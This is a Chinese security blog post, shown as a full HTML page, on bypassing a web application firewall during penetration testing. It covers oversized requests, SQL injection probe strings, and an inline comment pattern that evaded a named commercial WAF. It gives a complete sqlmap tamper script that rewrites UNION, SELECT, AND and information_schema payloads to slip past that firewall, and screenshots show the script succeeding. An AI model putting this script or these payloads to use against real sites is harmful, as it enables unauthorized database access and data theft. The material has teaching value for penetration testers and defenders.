<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>渗透测试中的Bypass技巧（三）自动化注入 « 倾旋的博客</title>
  <meta name="description" content="某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2017-03-10/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">渗透测试中的Bypass技巧（三）自动化注入</h1>
    <p class="post-meta">Mar 10, 2017</p>
  </header>

  <article class="post-content">
    <p>某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。
<!--more--></p>

<ul id="markdown-toc">
  <li><a href="#0x00-%E5%8C%B9%E9%85%8D%E8%B5%84%E6%BA%90%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6" id="markdown-toc-0x00-匹配资源大小限制">0x00 匹配资源大小限制</a></li>
  <li><a href="#0x01-%E7%BB%95%E8%BF%87%E6%9F%90waf%E4%B8%8A%E4%BC%A0" id="markdown-toc-0x01-绕过某waf上传">0x01 绕过某WAF上传</a></li>
  <li>
<a href="#0x02-%E7%BB%95%E8%BF%87%E6%9F%90waf%E6%B3%A8%E5%85%A5" id="markdown-toc-0x02-绕过某waf注入">0x02 绕过某WAF注入</a>    <ul>
      <li><a href="#%E6%B3%A8%E9%87%8A" id="markdown-toc-注释">注释</a></li>
    </ul>
  </li>
  <li><a href="#0x03-%E8%87%AA%E5%8A%A8%E5%8C%96bypass%E6%B3%A8%E5%85%A5" id="markdown-toc-0x03-自动化bypass注入">0x03 自动化bypass注入</a></li>
</ul>

<h2 id="0x00-匹配资源大小限制">0x00 匹配资源大小限制</h2>

<p>某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。</p>

<p>Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。可见WAF可能在处理GET请求的时候，根据客户端（浏览器）规定的长度去匹配了，这就造成了一个缺陷。我们可以把有效数据放在这个限制的零界点，攻击语句放在零界点后方，让WAF以为这是一个正常请求，就随之放行，达到了攻击效果。</p>

<p>理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。</p>

<p>例如在使用PHP进行POST提交时，文件大小受PHP配置文件PHP.INI限制，我们可以修改PHP.INI文件中的post_max_size参数，可将默认的2M字节，修改自己需要的大小，但由于HTTP协议的特性，这个值不宜设置过大，最大以8M为宜。假设如果服务器端设置了8M，而WAF默认只匹配2M，由此可见服务器端接受数据的大小&gt;WAF匹配的数据最大大小。那么，我们可以根据上述方法，也可绕过WAF的拦截。</p>

<h2 id="0x01-绕过某waf上传">0x01 绕过某WAF上传</h2>

<p>渗透测试中的Bypass技巧（二） - 知乎专栏</p>

<p>在上一章中我们已经举例了一个bypass上传，最重要的彩蛋就在Bypass注入啦~</p>

<h2 id="0x02-绕过某waf注入">0x02 绕过某WAF注入</h2>

<p>我们构造一个SQL注入页面，慢慢去研究它的拦截规则：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-309291e5dd2a98bf8796bf049e7cb731_r.jpg" alt="enter description here"></p>

<p>先从普通的语句开始做定位：</p>

<ul>
  <li>
    <p>and 1=1</p>
  </li>
  <li>
    <p>and ‘s’=’s’</p>
  </li>
  <li>
    <p>union select 1,2,3</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">union/**/select/**/user(),2,3</code></p>
  </li>
  <li>
    <p>……</p>
  </li>
  <li>等价替换</li>
  <li>And ‘s’ like ‘s’</li>
</ul>

<p>此时我们已经可以使用like用于盲注（此时可以将所有的 = 替换成 Like ）</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-d05618b362ce592aa4cb8b8381620b7a_r.jpg" alt="enter description here"></p>

<h3 id="注释">注释</h3>

<p>我们可以设想出拦截的特征正则</p>

<p>union与select同时出现会被拦截，union[空格,%20,/*部分字符*/]select都会被拦截，目前普通的union select都会被拦截，既然空格,%20都会被匹配到，我们只能通过/**/内联来注释了（目前发现N多姿势，在这里只共享思路+一个bypass的tamper脚本）</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/**/</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/*数字+字母*/</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/*特殊符号+数字+字母*/</code></p>
  </li>
  <li>
    <p>…..more</p>
  </li>
</ul>

<p>假设union左右如果有select就拦截的话，那么定位union与select之间的敏感字符就好，假设union<code class="language-plaintext highlighter-rouge">[空格]</code>select，此时如果把空格替换成任意内联，就可bypass这个规则，此时规则也不可能是一条的。条件也是很多的。我们也只能讲内联这个规则做手脚了。</p>

<p>于是乎我发现<code class="language-plaintext highlighter-rouge">/*^xxx^xxx*/</code>字母加特殊字符即可bypass。</p>

<p>因为每个特征中都没有匹配到^与小写字母、大写字母、数字的组合，这些条件可以继续测试，笔者已经把此文写到最佳精简，测试期间也翻看过拦截日志，定位拦截特征。</p>

<p>（Union注入）例如在读取：mysql密码、表名的时候，我们还会查询information_schema数据库，这个可以转换大小写，或者在information_schema.TABLES直接再添加一个注释。下面就是测试过程：首先测试简单的and 1=1</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-8496c213549317823092929a2764f72a_r.jpg" alt="enter description here"></p>

<p>然后我们使用注释bypass:</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-79b4d5253c14457c4e4493b438b4231e_r.jpg" alt="enter description here"></p>

<p>此时已经bypass成功了，我在这里用的是某dog 4.0（3.5也可以）</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-f54a5d6fe18955781f3d14a8802d3d7b_hd.jpg" alt="enter description here"></p>

<h2 id="0x03-自动化bypass注入">0x03 自动化bypass注入</h2>

<p>我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。</p>

<p>首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-78c541db6e25a98c01a0d3556fd5d321_r.jpg" alt="enter description here"></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="p">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
		<span class="n">bypass_SafeDog_str</span> <span class="o">=</span> <span class="s">"/*x^x*/"</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"UNION"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"UNION"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"SELECT"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"SELECT"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"AND"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"AND"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"="</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"information_schema."</span><span class="p">,</span><span class="s">"%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/"</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"FROM"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"FROM"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="c1">#print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."
</span>		<span class="k">print</span> <span class="n">payload</span>
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>

<p>我们测试一下先不载入tamper脚本：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-66446e8f8f6a49347e8a181bfbf79b73_hd.jpg" alt="enter description here"></p>

<p>到了这基本没戏了，我们看看拦截日志</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-38178932222e08df8395ac117fa8ec6d_r.jpg" alt="enter description here"></p>

<p>现在载入tamper脚本：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-070979a6ee68c8f3c0fc0ce384fd12a9_r.jpg" alt="enter description here"></p>

<p>可以看到已经载入，并且识别了waf指纹。</p>

<p>以下是跑脚本的过程</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-3cbe15d14ddef776ddca44a353768be6_r.jpg" alt="enter description here"></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-40d2293817e8e2a87d4281d71fe5f9d2_hd.jpg" alt="enter description here"></p>

<p>支持布尔值注入</p>

<p>支持union注入</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-091cfa9e51da47e78bf301db3c35f95b_hd.jpg" alt="enter description here"></p>

  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
